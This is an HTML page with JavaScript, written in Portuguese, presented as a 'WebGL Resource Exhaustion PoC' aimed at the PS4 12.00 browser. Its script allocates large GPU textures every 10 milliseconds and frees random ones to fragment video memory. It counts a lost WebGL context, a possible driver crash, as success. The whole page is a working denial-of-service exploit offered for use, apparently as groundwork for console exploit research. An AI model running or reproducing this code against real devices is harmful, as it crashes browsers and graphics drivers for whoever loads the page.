<!DOCTYPE html>
<html>
<head>
    <title>PS4 12.00 WebGL Fuzzer</title>
    <style>body { background-color: #202020; color: #fff; font-family: sans-serif; }</style>
</head>
<body>
    <h1>WebGL Resource Exhaustion PoC</h1>
    <p>Status: <span id="status">Pronto</span></p>
    <button onclick="startWebGLBomb()" style="padding: 20px; background: red; color: white; font-weight: bold; font-size: 1.2em;">INICIAR TESTE DE GPU</button>
    
    <canvas id="c" width="100" height="100" style="display:none"></canvas>
    <div id="log"></div>

    <script>
        function log(msg) { document.getElementById('log').innerHTML += msg + "<br>"; }

        function startWebGLBomb() {
            document.getElementById('status').innerText = "Estressando GPU...";
            log("Iniciando alocação massiva de Texturas...");

            const canvas = document.getElementById('c');
            // Tenta obter contexto WebGL (experimental ou padrão)
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

            if (!gl) {
                log("ERRO: WebGL não suportado ou desativado!");
                return;
            }

            const textures = [];
            let count = 0;

            // Loop agressivo de criação de texturas
            const interval = setInterval(() => {
                try {
                    // Criação de Textura
                    const texture = gl.createTexture();
                    gl.bindTexture(gl.TEXTURE_2D, texture);
                    
                    // Aloca memória na VRAM (GPU) sem enviar dados reais (NULL)
                    // Tenta alocar texturas grandes (4096 x 4096) repetidamente
                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, gl.RGBA, gl.UNSIGNED_BYTE, null);
                    
                    // Parâmetros para forçar processamento
                    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MIN_FILTER, gl.LINEAR);
                    gl.texParameteri(gl.TEXTURE_2D, gl.TEXTURE_MAG_FILTER, gl.LINEAR);

                    textures.push(texture);
                    count++;

                    if(count % 50 === 0) {
                        log(`Texturas alocadas: ${count} (Pressionando VRAM)`);
                    }

                    // Tenta causar fragmentação liberando texturas aleatórias no meio do processo
                    if(count > 100 && Math.random() > 0.8) {
                        const victim = textures.shift();
                        gl.deleteTexture(victim);
                    }

                } catch (e) {
                    log("Erro no WebGL: " + e.message);
                    // Se der erro de contexto perdido, é um bom sinal (o driver caiu)
                    if (gl.isContextLost()) {
                        log("SUCESSO: Contexto WebGL Perdido (Driver Crash?)");
                        clearInterval(interval);
                    }
                }
            }, 10); // Intervalo ultra-rápido (10ms)
        }
    </script>
</body>
</html>
